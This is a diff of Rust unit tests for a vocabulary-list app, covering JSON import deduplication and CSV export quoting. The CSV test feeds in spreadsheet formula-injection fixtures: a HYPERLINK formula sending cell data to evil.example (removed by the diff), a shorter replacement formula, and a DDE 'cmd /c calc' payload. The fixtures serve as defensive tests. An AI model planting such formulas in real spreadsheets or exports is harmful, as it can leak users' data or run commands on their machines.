+            find("一").last_practised.as_deref(),
+            Some("2026-01-02T00:00:00Z")
+        );
+        assert_eq!(find("二").best_score, Some(0.0));
+        assert!(crate::time::parse_iso8601(&find("二").added_at).is_some());
+        assert_eq!(find("二").last_practised, None);
+        assert_eq!(
+            find("三").best_score,
+            None,
+            "too large for an f32 is no score"
+        );
+
+        // A count already at the top saturates rather than overflowing.
+        let four = find("四").id;
+        assert_eq!(store.record_attempt(four, 50.0).unwrap().attempts, u32::MAX);
+    }
+
+    /// One word in one group once, however it arrives (issue #40): twice in
+    /// the same file, or already in the list, and spelt with stray spaces or not.
+    #[test]
+    fn importing_never_makes_a_duplicate() {
+        let json = r#"{"version":1,"nextId":9,"groups":["A"],"entries":[
+            {"id":1,"text":"好","group":"A","addedAt":"2026-01-01T00:00:00Z"},
+            {"id":2,"text":" 好 ","group":"A ","addedAt":"2026-01-01T00:00:01Z"},
+            {"id":3,"text":"好","addedAt":"2026-01-01T00:00:02Z"},
+            {"id":4,"text":"好 ","group":"","addedAt":"2026-01-01T00:00:03Z"},
+            {"id":5,"text":"坏","addedAt":"2026-01-01T00:00:04Z"}]}"#;
+
+        // Replacing: only the file's own repeats are skipped.
+        let mut store = VocabStore::in_memory();
+        store.add_entry("坏", "", "", None).unwrap();
+        let summary = store.import_json(json, false).unwrap();
+        assert_eq!(
+            (summary.added, summary.skipped_duplicates),
+            (3, 2),
+            "{summary:?}"
+        );
+
+        // Adding: what is already there is skipped too.
+        let mut store = VocabStore::in_memory();
+        store.add_entry("坏", "", "", None).unwrap();
+        store.add_entry("好", "", "", Some("A")).unwrap();
+        let summary = store.import_json(json, true).unwrap();
+        assert_eq!(
+            (summary.added, summary.skipped_duplicates),
+            (1, 4),
+            "{summary:?}"
+        );
+
+        let mut seen = std::collections::HashSet::new();
+        for entry in store.entries() {
+            assert!(
+                seen.insert((entry.text.clone(), entry.group.clone())),
+                "{entry:?}"
+            );
+        }
+    }
+
     #[test]
     fn csv_export_quotes_awkward_fields() {
         let mut store = VocabStore::in_memory();
@@ -1239,16 +1954,17 @@ mod tests {
         // meaning columns below have no comma of their own, so they would not
         // even be quoted.
         //
-        // Imported rather than added, because `add_entry` validates `text` and
-        // this is exactly the text it refuses: `import_json` takes the fields as
-        // they were written, which is the whole point of it being a boundary.
+        // Imported, the way a shared list arrives. Since issue #40 the import
+        // holds text to the rules `add_entry` does, and a formula short enough to
+        // be an entry passes them — nothing about `=` is invalid in a word list —
+        // so the export is still the boundary that has to defuse it.
         let hostile = serde_json::json!({
             "version": FORMAT_VERSION,
             "nextId": 2,
             "groups": ["-2+3"],
             "entries": [{
                 "id": 1,
-                "text": "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")",
+                "text": "=HYPERLINK(\"e.x\",A1)",
                 "pinyin": "+1+1",
                 "meaning": "@SUM(1+1)*cmd|' /c calc'!A0",
                 "group": "-2+3",
